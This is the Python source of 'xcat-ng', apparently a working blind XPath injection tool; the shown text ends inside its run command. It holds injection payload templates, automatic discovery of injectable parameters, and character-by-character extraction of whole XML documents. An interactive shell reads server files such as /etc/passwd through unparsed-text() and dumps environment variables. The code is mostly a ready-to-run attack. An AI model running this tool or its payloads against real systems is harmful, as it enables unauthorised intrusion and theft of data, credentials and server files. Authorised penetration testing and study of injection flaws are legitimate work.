#!/usr/bin/env python3
"""xcat-ng — Modern XPath Injection Framework"""
# Based on xcat by Tom Forbes (https://github.com/orf/xcat)

from __future__ import annotations

import argparse
import asyncio
import collections
import importlib.util
import math
import re
import readline   # noqa: F401 — enables arrow-key history in shell
import shlex
import sys
from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable, Dict, List, Optional, Tuple
from urllib.parse import parse_qs, urlencode, urlparse

try:
    import httpx
except ImportError:
    sys.exit("[!] Missing dependency: pip install httpx")


# ══════════════════════════════════════════════════════════════════════════════
# Colours
# ══════════════════════════════════════════════════════════════════════════════

class C:
    RST  = "\033[0m"
    BOLD = "\033[1m"
    RED  = "\033[91m"
    GRN  = "\033[92m"
    YLW  = "\033[93m"
    BLU  = "\033[94m"
    CYN  = "\033[96m"
    GRY  = "\033[90m"

def _c(s: str, *codes: str) -> str:
    return "".join(codes) + str(s) + C.RST

def info(m: str): print(_c(f"[*] {m}", C.BLU))
def ok(m: str):   print(_c(f"[+] {m}", C.GRN))
def warn(m: str): print(_c(f"[!] {m}", C.YLW))
def err(m: str):  print(_c(f"[-] {m}", C.RED))

VERBOSE = False
def dbg(m: str):
    if VERBOSE:
        print(_c(f"[D] {m}", C.GRY), file=sys.stderr)


BANNER = """\033[96m\033[1m
 ██╗  ██╗ ██████╗ █████╗ ████████╗      ███╗   ██╗ ██████╗
 ╚██╗██╔╝██╔════╝██╔══██╗╚══██╔══╝      ████╗  ██║██╔════╝
  ╚███╔╝ ██║     ███████║   ██║   █████╗██╔██╗ ██║██║  ███╗
  ██╔██╗ ██║     ██╔══██║   ██║   ╚════╝██║╚██╗██║██║   ██║
 ██╔╝ ██╗╚██████╗██║  ██║   ██║         ██║ ╚████║╚██████╔╝
 ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝         ╚═╝  ╚═══╝ ╚═════╝\033[0m
\033[93m Modern XPath Injection Framework  (next-generation)\033[0m
"""


# ══════════════════════════════════════════════════════════════════════════════
# Constants  (from original xcat)
# ══════════════════════════════════════════════════════════════════════════════

# Original xcat ASCII_SEARCH_SPACE — used for substring-before() search
# Note: apostrophe excluded because it breaks XPath string literals.
# It is included in FULL_CHARSET for the linear fallback (handled via quote-swap).
ASCII_SEARCH_SPACE = (
    "0123456789abcdefghijklmnopqrstuvwxyz"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "+./:@_ -,()!"
)
FULL_CHARSET = ASCII_SEARCH_SPACE + "'"

MISSING_CHAR   = "?"
DEFAULT_CONCURRENCY = 10
DEFAULT_TIMEOUT     = 15
FAST_MODE_LEN       = 15


# ══════════════════════════════════════════════════════════════════════════════
# Injection templates  (from original xcat injections.py — exact same payloads)
# ══════════════════════════════════════════════════════════════════════════════

@dataclass(frozen=True)
class Injection:
    name:    str
    example: str
    # test_templates: list of (payload_template, expected_bool)
    # {working} is replaced with the current parameter value
    tests:   Tuple[Tuple[str, bool], ...]
    # expr_template: how to wrap an XPath expression into a payload
    # either a format string with {working} and {expression},
    # or a callable(working, expression) -> str
    expr:    object  # str | Callable

    def make_payload(self, working: str, expression: str) -> str:
        if callable(self.expr):
            return self.expr(working, expression)
        return self.expr.format(working=working, expression=expression)

    def test_payloads(self, working: str) -> List[Tuple[str, bool]]:
        return [(t.format(working=working), expected) for t, expected in self.tests]


INJECTIONS: List[Injection] = [
    Injection(
        name    = "integer",
        example = "/lib/book[id=?]",
        tests   = (
            ("{working} and 1=1", True),
            ("{working} and 1=2", False),
        ),
        expr = "{working} and {expression}",
    ),
    Injection(
        name    = "string - single quote",
        example = "/lib/book[name='?']",
        tests   = (
            ("{working}' and '1'='1", True),
            ("{working}' and '1'='2", False),
        ),
        expr = "{working}' and {expression} and '1'='1",
    ),
    Injection(
        name    = "string - double quote",
        example = '/lib/book[name="?"]',
        tests   = (
            ('{working}" and "1"="1', True),
            ('{working}" and "1"="2', False),
        ),
        expr = '{working}" and {expression} and "1"="1',
    ),
    Injection(
        name    = "string - single quote (closing paren)",
        example = "/lib/book[name='?')]",
        tests   = (
            ("{working}') and ('1'='1", True),
            ("{working}') and ('1'='2", False),
        ),
        expr = "{working}') and {expression} and ('1'='1",
    ),
    Injection(
        name    = "string - double quote (closing paren)",
        example = '/lib/book[fn("?")]',
        tests   = (
            ('{working}") and ("1"="1', True),
            ('{working}") and ("1"="2', False),
        ),
        expr = '{working}") and {expression} and ("1"="1',
    ),
    Injection(
        name    = "attribute - prefix",
        example = "/lib/book[?=value]",
        tests   = (
            ("1=1 and {working}", True),
            ("1=2 and {working}", False),
        ),
        expr = lambda w, e: f"{e} and {w}",
    ),
    Injection(
        name    = "attribute - postfix",
        example = "/lib/book[value=?]",
        tests   = (
            ("{working} and not 1=2 and {working}", True),
            ("{working} and 1=2 and {working}",     False),
        ),
        expr = lambda w, e: f"{w} and {e} and {w}",
    ),
    Injection(
        name    = "element - postfix",
        example = "/lib/?something",
        tests   = (
            ("{working}[true()]",  True),
            ("{working}[false()]", False),
        ),
        expr = lambda w, e: f"{w}[{e}]",
    ),
    Injection(
        name    = "function call - single quote",
        example = "/lib/something[fn(?)]",
        tests   = (
            ("{working}') and true() and string('1'='1",  True),
            ("{working}') and false() and string('1'='1", False),
        ),
        expr = "{working}') and {expression} and string('1'='1",
    ),
    Injection(
        name    = "function call - double quote",
        example = "/lib/something[fn(?)]",
        tests   = (
            ('{working}") and true() and string("1"="1',  True),
            ('{working}") and false() and string("1"="1', False),
        ),
        expr = '{working}") and {expression} and string("1"="1',
    ),
]


# ══════════════════════════════════════════════════════════════════════════════
# Features  (from original xcat features.py)
# ══════════════════════════════════════════════════════════════════════════════

@dataclass(frozen=True)
class Feature:
    name:  str
    desc:  str
    # All XPath expressions must evaluate to true for feature to be present
    tests: Tuple[str, ...]


FEATURES: List[Feature] = [
    Feature("xpath-2", "XPath 2.0", (
        "lower-case('A')='a'",
        "ends-with('test','st')",
        "encode-for-uri('test')='test'",
    )),
    Feature("xpath-3", "XPath 3.0", (
        "boolean(generate-id(/))",
    )),
    Feature("normalize-space", "normalize-space()", (
        "normalize-space('  a  b ')='a b'",
    )),
    Feature("substring-search", "substring-before() char search", (
        f"string-length(substring-before('{ASCII_SEARCH_SPACE}','h'))="
        f"{ASCII_SEARCH_SPACE.find('h')}",
    )),
    Feature("codepoint-search", "string-to-codepoints() (XPath 2.0)", (
        "string-to-codepoints('test')[1]=116",
    )),
    Feature("environment-variables", "available-environment-variables()", (
        "exists(available-environment-variables())",
    )),
    Feature("document-uri", "document-uri()", (
        "string-length(document-uri(/))>0",
    )),
    Feature("base-uri", "base-uri()", (
        "string-length(base-uri())>0",
    )),
    Feature("current-datetime", "current-dateTime()", (
        "string-length(string(current-dateTime()))>0",
    )),
    Feature("unparsed-text", "unparsed-text() / file reading", (
        "unparsed-text-available(document-uri(/))",
    )),
    Feature("doc-function", "doc() / doc-available()", (
        "doc-available(document-uri(/))",
    )),
    Feature("linux", "Linux (/etc/passwd readable)", (
        "unparsed-text-available('/etc/passwd')",
    )),
]


# ══════════════════════════════════════════════════════════════════════════════
# Burp request parser
# ══════════════════════════════════════════════════════════════════════════════

@dataclass
class ParsedRequest:
    method:  str
    url:     str
    headers: Dict[str, str]
    params:  Dict[str, str]   # query string
    body:    Dict[str, str]   # POST body (form-encoded)

    @property
    def all_params(self) -> Dict[str, str]:
        """All parameters (query + body) in one dict."""
        return {**self.params, **self.body}

    @classmethod
    def from_burp(cls, path: str) -> "ParsedRequest":
        text  = Path(path).read_text(errors="replace")
        lines = text.splitlines()
        if not lines:
            sys.exit(f"[-] Empty request file: {path}")

        m = re.match(r"^(\w+)\s+(\S+)\s+HTTP/", lines[0])
        if not m:
            sys.exit(f"[-] Cannot parse request line: {lines[0]!r}")

        method   = m.group(1).upper()
        path_qs  = m.group(2)
        headers: Dict[str, str] = {}
        i = 1
        while i < len(lines) and lines[i].strip():
            if ":" in lines[i]:
                k, _, v = lines[i].partition(":")
                headers[k.strip()] = v.strip()
            i += 1
        raw_body = "\n".join(lines[i+1:]).strip()

        host   = headers.get("Host", "localhost")
        scheme = "https" if ":443" in host or host.endswith(":443") else "http"
        parsed = urlparse(f"{scheme}://{host}{path_qs}")
        params = {k: v[0] for k, v in parse_qs(parsed.query, keep_blank_values=True).items()}

        body: Dict[str, str] = {}
        ct = headers.get("Content-Type", "")
        if raw_body and "application/x-www-form-urlencoded" in ct:
            body = {k: v[0] for k, v in parse_qs(raw_body, keep_blank_values=True).items()}
        elif raw_body and not body:
            # Try to parse anyway if it looks like form data
            try:
                body = {k: v[0] for k, v in parse_qs(raw_body, keep_blank_values=True).items()}
            except Exception:
                pass

        for drop in ("Accept-Encoding", "Content-Length", "If-None-Match",
                     "Cache-Control", "Pragma"):
            headers.pop(drop, None)

        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        return cls(method=method, url=base, headers=headers, params=params, body=body)


# ══════════════════════════════════════════════════════════════════════════════
# Attack context
# ══════════════════════════════════════════════════════════════════════════════

@dataclass
class Ctx:
    """
    Mutable attack context. Holds everything needed during an attack.
    Mirrors original xcat AttackContext but as a dataclass (mutable).
    """
    req:          ParsedRequest
    target_param: str                        # which parameter to inject
    match_fn:     Callable[[int, str], bool] # oracle
    concurrency:  int
    fast_mode:    bool
    timeout:      int
    proxy:        Optional[str]
    injection:    Optional[Injection]        = None
    tamper_fn:    Optional[Callable]         = None
    features:     Dict[str, bool]            = field(default_factory=dict)
    # frequency caches — speed up repeated char/string lookups
    common_chars: collections.Counter        = field(default_factory=collections.Counter)
    common_strs:  collections.Counter        = field(default_factory=collections.Counter)
    _client:      Optional[httpx.AsyncClient] = field(default=None, repr=False)
    _sem:         Optional[asyncio.Semaphore] = field(default=None, repr=False)

    async def start(self):
        kw: Dict = dict(timeout=self.timeout, verify=False)
        if self.proxy:
            kw["proxies"] = {"all://": self.proxy}
        self._client = httpx.AsyncClient(**kw)
        self._sem    = asyncio.Semaphore(self.concurrency)

    async def close(self):
        if self._client:
            await self._client.aclose()

    def has(self, feature: str) -> bool:
        return self.features.get(feature, False)

    @property
    def working_value(self) -> str:
        """Current value of the injected parameter."""
        return self.req.all_params.get(self.target_param, "")

    def ordered_chars(self) -> str:
        """Charset ordered by observed frequency (speeds up linear scan)."""
        seen = sorted(self.common_chars, key=lambda c: -self.common_chars[c])
        rest = [c for c in FULL_CHARSET if c not in self.common_chars]
        return "".join(seen) + "".join(rest)


# ══════════════════════════════════════════════════════════════════════════════
# HTTP
# ══════════════════════════════════════════════════════════════════════════════

async def _send(ctx: Ctx, param_overrides: Dict[str, str]) -> Tuple[int, str]:
    """Send HTTP request with given parameter values substituted in."""
    q = dict(ctx.req.params)
    b = dict(ctx.req.body)
    for k, v in param_overrides.items():
        if k in q:  q[k] = v
        else:       b[k] = v

    if ctx.req.method.upper() in ("GET", "DELETE", "HEAD"):
        kw = dict(params=q, headers=ctx.req.headers)
    else:
        merged = {**q, **b}
        kw = dict(data=merged, headers=ctx.req.headers)

    if ctx.tamper_fn:
        ctx.tamper_fn(ctx, kw)

    async with ctx._sem:
        try:
            r = await ctx._client.request(ctx.req.method, ctx.req.url, **kw)
            return r.status_code, r.text
        except Exception as e:
            dbg(f"request error: {e}")
            return 0, ""


async def check(ctx: Ctx, expression: str) -> bool:
    """
    Core oracle — mirrors original xcat check().
    Wraps XPath expression into injection payload, sends, checks match function.
    """
    payload = ctx.injection.make_payload(ctx.working_value, expression)
    status, body = await _send(ctx, {ctx.target_param: payload})
    result = ctx.match_fn(status, body)
    dbg(f"check({expression!r}) payload={payload!r} → {result}")
    return result


# ══════════════════════════════════════════════════════════════════════════════
# Injection detection  (mirrors original xcat detect_injections exactly)
# ══════════════════════════════════════════════════════════════════════════════

async def _test_injection(ctx: Ctx, param: str, inj: Injection) -> bool:
    """
    Test one injector on one parameter.
    Sends all test payloads; returns True if ALL results match expectations.
    Exact logic from original xcat.
    """
    working = ctx.req.all_params.get(param, "")
    payloads = inj.test_payloads(working)
    results  = await asyncio.gather(*[
        _check_raw(ctx, param, payload)
        for payload, _ in payloads
    ])
    ok_list = [got == expected for got, (_, expected) in zip(results, payloads)]
    dbg(f"  {inj.name!r} on {param!r}: {ok_list}")
    return all(ok_list)


async def _check_raw(ctx: Ctx, param: str, payload: str) -> bool:
    """Send a raw payload (no injection wrapping) and check oracle."""
    status, body = await _send(ctx, {param: payload})
    return ctx.match_fn(status, body)


async def detect_injections(ctx: Ctx, param: str) -> List[Injection]:
    """
    Test all injectors on a parameter.
    Returns list of working injectors (mirrors original xcat detect_injections).
    """
    hits = []
    for inj in INJECTIONS:
        if await _test_injection(ctx, param, inj):
            hits.append(inj)
    return hits


async def auto_discover(ctx: Ctx) -> Optional[Tuple[str, Injection]]:
    """
    Added vs original xcat: probe ALL parameters automatically.
    If ctx.target_param is set, only that parameter is tested.
    Returns (param_name, injection) or None.
    """
    params = ctx.req.all_params
    if not params:
        err("No parameters found in request.")
        return None

    if ctx.target_param and ctx.target_param in params:
        ranked = [ctx.target_param]
    else:
        # Prefer non-numeric params, longer values first
        ranked = sorted(params, key=lambda k: (params[k].isdigit(), -len(params[k])))
        if not ctx.target_param:
            warn(f"No --param specified, probing all {len(ranked)} parameter(s)")

    for param in ranked:
        info(f"  Probing: {_c(param, C.CYN)}")
        hits = await detect_injections(ctx, param)
        if hits:
            return param, hits[0]

    return None


# ══════════════════════════════════════════════════════════════════════════════
# Feature detection  (mirrors original xcat detect_features)
# ══════════════════════════════════════════════════════════════════════════════

async def detect_features(ctx: Ctx) -> Dict[str, bool]:
    """Test each feature. All its XPath expressions must be true."""
    result: Dict[str, bool] = {}

    async def probe(feat: Feature):
        checks = await asyncio.gather(*[check(ctx, expr) for expr in feat.tests])
        result[feat.name] = all(checks)

    await asyncio.gather(*[probe(f) for f in FEATURES])

    for feat in FEATURES:
        v    = result.get(feat.name, False)
        icon = _c("✓", C.GRN) if v else _c("✗", C.RED)
        print(f"  {icon} {feat.name:<32} {_c(feat.desc, C.GRY)}")

    return result


# ══════════════════════════════════════════════════════════════════════════════
# Algorithms  (mirrors original xcat algorithms.py)
# ══════════════════════════════════════════════════════════════════════════════

async def binary_search(ctx: Ctx, expression: str,
                        lo: int = 0, hi: int = 25,
                        _depth: int = 0) -> int:
    """
    Mirrors original xcat binary_search().
    Finds the integer value of a numeric XPath expression.
    """
    if _depth > 12:
        return -1
    if await check(ctx, f"({expression}) > {hi}"):
        return await binary_search(ctx, expression, lo, hi * 2, _depth + 1)
    while lo <= hi:
        mid = (lo + hi) // 2
        if await check(ctx, f"({expression}) < {mid}"):
            hi = mid - 1
        elif await check(ctx, f"({expression}) > {mid}"):
            lo = mid + 1
        else:
            return mid
    return -1


async def count(ctx: Ctx, expression: str) -> int:
    """Count nodes — mirrors original xcat count()."""
    r = await binary_search(ctx, f"count({expression})", lo=0)
    return max(0, r)


async def string_length(ctx: Ctx, expression: str) -> int:
    r = await binary_search(ctx, f"string-length({expression})", lo=0)
    if r < 0 or r > 4096:
        return 0
    return r


# ── character extraction strategies  (mirrors original xcat algorithms.py) ──

async def _codepoint_search(ctx: Ctx, expr: str) -> Optional[str]:
    """O(log N) — string-to-codepoints(), XPath 2.0."""
    code = await binary_search(ctx, f"string-to-codepoints({expr})[1]", lo=0, hi=255)
    return chr(code) if code > 0 else None


async def _substring_search(ctx: Ctx, expr: str) -> Optional[str]:
    """
    O(log N) — substring-before() on ASCII_SEARCH_SPACE.
    Mirrors original xcat substring_search().
    First char needs explicit check: substring-before returns "" for both
    "not found" and "is the first character".
    """
    space = ASCII_SEARCH_SPACE
    if await check(ctx, f"{expr}='{space[0]}'"):
        return space[0]
    idx = await binary_search(
        ctx,
        f"string-length(substring-before('{space}',{expr}))",
        lo=0, hi=len(space),
    )
    return space[idx] if 0 < idx < len(space) else None


async def _linear_search(ctx: Ctx, expr: str) -> Optional[str]:
    """
    O(N) frequency-ordered linear scan — mirrors original xcat "dumb search".
    Fallback for XPath 1.0 (no codepoint or substring-before features).
    """
    for ch in ctx.ordered_chars():
        q = '"' if ch == "'" else "'"
        if await check(ctx, f"{expr}={q}{ch}{q}"):
            ctx.common_chars[ch] += 1
            return ch
    return None


async def get_char(ctx: Ctx, expr: str) -> Optional[str]:
    """Pick best char extraction strategy by detected features."""
    if ctx.has("codepoint-search"):
        return await _codepoint_search(ctx, expr)
    if ctx.has("substring-search"):
        return await _substring_search(ctx, expr)
    return await _linear_search(ctx, expr)


# ── progress bar ─────────────────────────────────────────────────────────────

def _progress(done: int, total: int, partial: str):
    bar_w  = 28
    filled = int(bar_w * done / total) if total else 0
    bar    = "█" * filled + "░" * (bar_w - filled)
    print(
        f"\r [{C.CYN}{bar}{C.RST}] {done}/{total}  {C.GRN}{partial}{C.RST}",
        end="", flush=True, file=sys.stderr,
    )


# ── string extraction  (mirrors original xcat get_string()) ─────────────────

async def _try_common_string(ctx: Ctx, expr: str, length: int) -> Optional[str]:
    """Try cached common strings before char-by-char (mirrors original xcat)."""
    if length >= 10:
        return None
    candidates = [s for s, _ in ctx.common_strs.most_common() if len(s) == length][:5]
    if not candidates:
        return None
    hits = await asyncio.gather(*[check(ctx, f"{expr}='{c}'") for c in candidates])
    for hit, s in zip(hits, candidates):
        if hit:
            ctx.common_strs[s] += 1
            return s
    return None


async def get_string(ctx: Ctx, expression: str, fast: bool = False) -> str:
    """
    Mirrors original xcat get_string().
    Extracts string value of an XPath expression char by char.
    Shows live progress bar on stderr.
    """
    work = f"normalize-space({expression})" if ctx.has("normalize-space") else expression

    total = await string_length(ctx, work)
    if total <= 0:
        return ""

    cached = await _try_common_string(ctx, work, total)
    if cached is not None:
        return cached

    fetch = min(FAST_MODE_LEN, total) if fast else total
    chars = [MISSING_CHAR] * fetch
    done  = [0]

    async def fetch_char(pos: int):
        ch = await get_char(ctx, f"substring({work},{pos},1)")
        chars[pos - 1] = ch or MISSING_CHAR
        done[0] += 1
        _progress(done[0], fetch, "".join(chars))

    await asyncio.gather(*[fetch_char(i) for i in range(1, fetch + 1)])
    print(file=sys.stderr)  # newline after progress bar

    result = "".join(chars)
    if fast and fetch < total:
        result += f"... (+{total - fetch} chars)"
    elif total <= 10:
        ctx.common_strs[result] += 1

    return result


# ══════════════════════════════════════════════════════════════════════════════
# XML tree exfiltration  (mirrors original xcat get_nodes / display_xml)
# ══════════════════════════════════════════════════════════════════════════════

async def exfiltrate_node(
    ctx:          Ctx,
    xpath:        str,
    depth:        int = 0,
    max_depth:    int = 12,
    max_children: int = 40,
    xml_lines:    Optional[List[str]] = None,
) -> None:
    """
    Recursively extract an XML subtree.
    Mirrors original xcat get_nodes() but prints each tag immediately (live).
    xml_lines accumulates clean XML for final summary.
    Progress bars go to stderr.
    """
    indent = "  " * depth
    fast   = ctx.fast_mode

    # Extract name + attr count + child count in parallel
    name_val, attr_count, n_children = await asyncio.gather(
        get_string(ctx, f"name({xpath})",  fast=fast),
        count(ctx, f"{xpath}/@*"),
        count(ctx, f"{xpath}/*"),
    )
    if not name_val:
        name_val = f"node_{depth}"

    # Extract all attributes in parallel
    attrs: Dict[str, str] = {}
    if attr_count:
        pairs = await asyncio.gather(*[
            asyncio.gather(
                get_string(ctx, f"name(({xpath}/@*)[{i}])", fast=fast),
                get_string(ctx, f"string(({xpath}/@*)[{i}])", fast=fast),
            )
            for i in range(1, attr_count + 1)
        ])
        attrs = {k: v for k, v in pairs if k}

    attr_str  = (" " + " ".join(f'{k}="{v}"' for k, v in attrs.items())) if attrs else ""
    open_tag  = f"{indent}<{name_val}{attr_str}>"
    close_tag = f"{indent}</{name_val}>"

    # Print open tag immediately (live output)
    print(_c(open_tag, C.CYN))
    if xml_lines is not None:
        xml_lines.append(open_tag)

    if n_children == 0 or depth >= max_depth:
        # Leaf node: extract text content
        text = await get_string(ctx, f"string({xpath})", fast=fast)
        if text:
            val_line = f"{indent}  {text}"
            print(_c(val_line, C.GRN))
            if xml_lines is not None:
                xml_lines.append(val_line)
    else:
        for i in range(1, min(n_children, max_children) + 1):
            await exfiltrate_node(
                ctx, f"({xpath}/*)[{i}]",
                depth + 1, max_depth, max_children, xml_lines,
            )

    print(_c(close_tag, C.CYN))
    if xml_lines is not None:
        xml_lines.append(close_tag)


# ══════════════════════════════════════════════════════════════════════════════
# Interactive shell  (mirrors original xcat shell.py)
# ══════════════════════════════════════════════════════════════════════════════

SHELL_HELP = """
\033[1mxcat-ng interactive shell\033[0m

  \033[96mget <xpath>\033[0m          Dump XML subtree at XPath
  \033[96mget-string <xpath>\033[0m   Get string value of XPath expression
  \033[96menv [name]\033[0m           List all env vars, or get one by name
  \033[96mpwd\033[0m                  Working directory (base-uri / document-uri)
  \033[96mtime\033[0m                 Server date/time (current-dateTime)
  \033[96mcat <path>\033[0m           Read file via unparsed-text()
  \033[96mfind <filename>\033[0m      Search file in parent directories
  \033[96mfeatures\033[0m             Show all feature flags
  \033[96mtoggle <feature>\033[0m     Toggle a feature on/off
  \033[96mhelp\033[0m                 Show this help
  \033[96mexit\033[0m                 Quit
"""


async def shell_loop(ctx: Ctx):
    print(SHELL_HELP)
    while True:
        try:
            line = input(f"{_c('XCat', C.RED)}{_c('$ ', C.GRN)}").strip()
        except (EOFError, KeyboardInterrupt):
            print(); break
        if not line:
            continue
        parts = shlex.split(line)
        cmd, args = parts[0].lower(), parts[1:]
        try:
            if cmd in ("exit", "quit"):
                break

            elif cmd == "help":
                print(SHELL_HELP)

            elif cmd == "get":
                if not args: err("Usage: get <xpath>"); continue
                xml_lines: List[str] = []
                await exfiltrate_node(ctx, args[0], xml_lines=xml_lines)
                print()
                print(_c("═" * 64, C.BOLD))
                for ln in xml_lines:
                    print(_c(ln, C.CYN) if ln.strip().startswith("<") else _c(ln, C.GRN))
                print(_c("═" * 64, C.BOLD))

            elif cmd == "get-string":
                if not args: err("Usage: get-string <xpath>"); continue
                print(_c(await get_string(ctx, args[0]), C.GRN))

            elif cmd == "env":
                if not ctx.has("environment-variables"):
                    warn("Feature 'environment-variables' not available"); continue
                if args:
                    print(_c(await get_string(ctx, f"environment-variable('{args[0]}')"), C.GRN))
                else:
                    n = await count(ctx, "available-environment-variables()")
                    for i in range(1, n + 1):
                        name = await get_string(ctx, f"available-environment-variables()[{i}]")
                        val  = await get_string(ctx, f"environment-variable('{name}')")
                        print(f"{_c(name, C.CYN)}={_c(val, C.GRN)}")

            elif cmd == "pwd":
                if ctx.has("base-uri"):
                    print(_c(await get_string(ctx, "base-uri()"), C.GRN))
                elif ctx.has("document-uri"):
                    print(_c(await get_string(ctx, "document-uri(/)"), C.GRN))
                else:
                    warn("Neither base-uri nor document-uri available")

            elif cmd == "time":
                if not ctx.has("current-datetime"):
                    warn("Feature 'current-datetime' not available"); continue
                print(_c(await get_string(ctx, "string(current-dateTime())"), C.GRN))

            elif cmd == "cat":
                if not args: err("Usage: cat <path>"); continue
                if not ctx.has("unparsed-text"):
                    warn("Feature 'unparsed-text' not available"); continue
                path = args[0]
                if not await check(ctx, f"unparsed-text-available('{path}')"):
                    warn(f"File may not be available: {path}")
                    if input("Try anyway? [y/N] ").strip().lower() != "y":
                        continue
                n = await count(ctx, f"unparsed-text-lines('{path}')")
                for i in range(1, n + 1):
                    print(await get_string(ctx, f"unparsed-text-lines('{path}')[{i}]"))

            elif cmd == "find":
                if not args: err("Usage: find <filename>"); continue
                for i in range(10):
                    rel = ("../" * i) + args[0]
                    expr = f"resolve-uri('{rel}', document-uri(/))"
                    if ctx.has("doc-function") and await check(ctx, f"doc-available({expr})"):
                        ok(f"[XML ] {rel}")
                    if ctx.has("unparsed-text") and await check(ctx, f"unparsed-text-available({expr})"):
                        ok(f"[TEXT] {rel}")

            elif cmd == "features":
                for k, v in ctx.features.items():
                    print(f"  {k:<34} {_c('on', C.GRN) if v else _c('off', C.RED)}")

            elif cmd == "toggle":
                if not args: err("Usage: toggle <feature>"); continue
                f = args[0]
                ctx.features[f] = not ctx.features.get(f, False)
                print(f"{f} → {_c('on', C.GRN) if ctx.features[f] else _c('off', C.RED)}")

            else:
                err(f"Unknown command '{cmd}'. Type 'help'.")

        except KeyboardInterrupt:
            print()
        except Exception as exc:
            err(f"Error: {exc}")
            if VERBOSE:
                import traceback; traceback.print_exc()


# ══════════════════════════════════════════════════════════════════════════════
# Oracle  (mirrors original xcat utils.make_match_function — exact same logic)
# ══════════════════════════════════════════════════════════════════════════════

def make_match_fn(
    true_string:  Optional[str],
    true_code:    Optional[str],
    false_string: Optional[str],
    false_code:   Optional[str],
) -> Callable[[int, str], bool]:
    """
    Build the oracle function.
    Mirrors original xcat make_match_function() plus adds --false-string / --false-code.

    TRUE  = XPath condition evaluated to true  (e.g. correct char guessed)
    FALSE = XPath condition evaluated to false

    --true-string TEXT   response body contains TEXT  → TRUE
    --true-string !TEXT  response body lacks TEXT     → TRUE
    --true-code CODE     response status == CODE      → TRUE
    --true-code !CODE    response status != CODE      → TRUE
    --false-string TEXT  response body contains TEXT  → FALSE (overrides true)
    --false-code CODE    response status == CODE      → FALSE (overrides true)
    """
    # Parse negation prefix
    ts_negate = False
    tc_negate = False
    if true_string and true_string.startswith("!"):
        ts_negate, true_string = True, true_string[1:]
    if true_code and str(true_code).startswith("!"):
        tc_negate, true_code = True, str(true_code)[1:]

    tc_int = int(true_code)  if true_code  else None
    fc_int = int(false_code) if false_code else None

    def fn(status: int, body: str) -> bool:
        # false-string / false-code take priority (explicit FALSE signal)
        if false_string and false_string in body:
            return False
        if fc_int is not None and status == fc_int:
            return False

        # Check true-code
        if tc_int is not None:
            code_match = (status == tc_int)
            if tc_negate:
                code_match = not code_match
            if not code_match:
                return False

        # Check true-string
        if true_string is not None:
            str_match = (true_string in body)
            if ts_negate:
                str_match = not str_match
            if not str_match:
                return False

        return True

    return fn


# ══════════════════════════════════════════════════════════════════════════════
# Setup helpers
# ══════════════════════════════════════════════════════════════════════════════

def build_ctx(args: argparse.Namespace) -> Ctx:
    # Parse request source
    if getattr(args, "request", None):
        req = ParsedRequest.from_burp(args.request)
    elif getattr(args, "url", None):
        headers: Dict[str, str] = {}
        for h in (getattr(args, "header", None) or []):
            if ":" in h:
                k, _, v = h.partition(":"); headers[k.strip()] = v.strip()
        params: Dict[str, str] = {}
        for p in (getattr(args, "param_values", None) or []):
            if "=" in p:
                k, _, v = p.partition("="); params[k] = v
        body: Dict[str, str] = {}
        for b in (getattr(args, "body_params", None) or []):
            if "=" in b:
                k, _, v = b.partition("="); body[k] = v
        req = ParsedRequest(
            method  = args.method.upper(),
            url     = args.url,
            headers = headers,
            params  = params,
            body    = body,
        )
    else:
        sys.exit("[-] Provide -r/--request FILE  or  --url URL")

    # Require at least one oracle flag
    has_oracle = any([
        getattr(args, "true_string",  None),
        getattr(args, "true_code",    None),
        getattr(args, "false_string", None),
        getattr(args, "false_code",   None),
    ])
    if not has_oracle:
        sys.exit(
            "[-] Need at least one oracle flag:\n"
            "    --true-string TEXT     text present in a TRUE response\n"
            "    --true-string '!TEXT'  text absent  in a TRUE response\n"
            "    --true-code CODE       HTTP status for TRUE  (e.g. 200)\n"
            "    --false-string TEXT    text present in a FALSE response\n"
            "    --false-code CODE      HTTP status for FALSE"
        )

    target = getattr(args, "param", None) or ""

    tamper_fn = None
    if getattr(args, "tamper", None):
        spec = importlib.util.spec_from_file_location("tamper", args.tamper)
        mod  = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        tamper_fn = getattr(mod, "tamper", None)

    ctx = Ctx(
        req          = req,
        target_param = target,
        match_fn     = make_match_fn(
            getattr(args, "true_string",  None),
            getattr(args, "true_code",    None),
            getattr(args, "false_string", None),
            getattr(args, "false_code",   None),
        ),
        concurrency  = args.concurrency,
        fast_mode    = getattr(args, "fast", False),
        timeout      = args.timeout,
        proxy        = getattr(args, "proxy", None),
        tamper_fn    = tamper_fn,
    )
    for f in (getattr(args, "enable",  None) or []):
        ctx.features[f] = True
    for f in (getattr(args, "disable", None) or []):
        ctx.features[f] = False
    return ctx


async def setup(ctx: Ctx) -> bool:
    """Find injection, set ctx.injection + ctx.target_param, detect features."""
    info("Probing for injection points...")
    result = await auto_discover(ctx)
    if not result:
        err("No injection point found.")
        warn("Tips:")
        warn("  --true-string TEXT   text present in response when XPath is TRUE")
        warn("  --false-string TEXT  text present in response when XPath is FALSE")
        warn("  --true-string '!X'   negate: TRUE when X is absent")
        warn("  -v                   show debug output")
        return False

    param, inj = result
    ctx.target_param = param
    ctx.injection    = inj

    ok(f"Injection found  param={_c(param, C.CYN)}  type={_c(inj.name, C.YLW)}")
    print(f"  Example : {inj.example}")
    print()

    info("Detecting server features...")
    feats = await detect_features(ctx)
    ctx.features.update(feats)
    print()
    return True


# ══════════════════════════════════════════════════════════════════════════════
# Commands
# ══════════════════════════════════════════════════════════════════════════════

async def cmd_detect(args: argparse.Namespace):
    ctx = build_ctx(args)
    await ctx.start()
    try:
        await setup(ctx)
    finally:
        await ctx.close()


async def cmd_run(args: argparse.Namespace):
    ctx = build_ctx(args)
    await ctx.start()
    try:
        if not await setup(ctx):
            sys.exit(1)

        info("Extracting XML document...")
        print(_c("─" * 64, C.GRY))

        xml_lines: List[str] = []
        try:
            await exfiltrate_node(
                ctx, "/*",
                max_depth    = getattr(args, "max_depth",    12),
                max_children = getattr(args, "max_children", 40),
                xml_lines    = xml_lines,
            )
        except KeyboardInterrupt:
            warn("Interrupted — partial result:")

        print()
        print(_c("═" * 64, C.BOLD))
        print(_c("  EXTRACTED XML", C.BOLD))
        print(_c("═" * 64, C.BOLD))
        for ln in xml_lines:
            print(_c(ln, C.CYN) if ln.strip().startswith("<") else _c(ln, C.GRN))
        print(_c("═" * 64, C.BOLD))

        if getattr(args, "output", None):
            Path(args.output).write_text("\n".join(xml_lines))
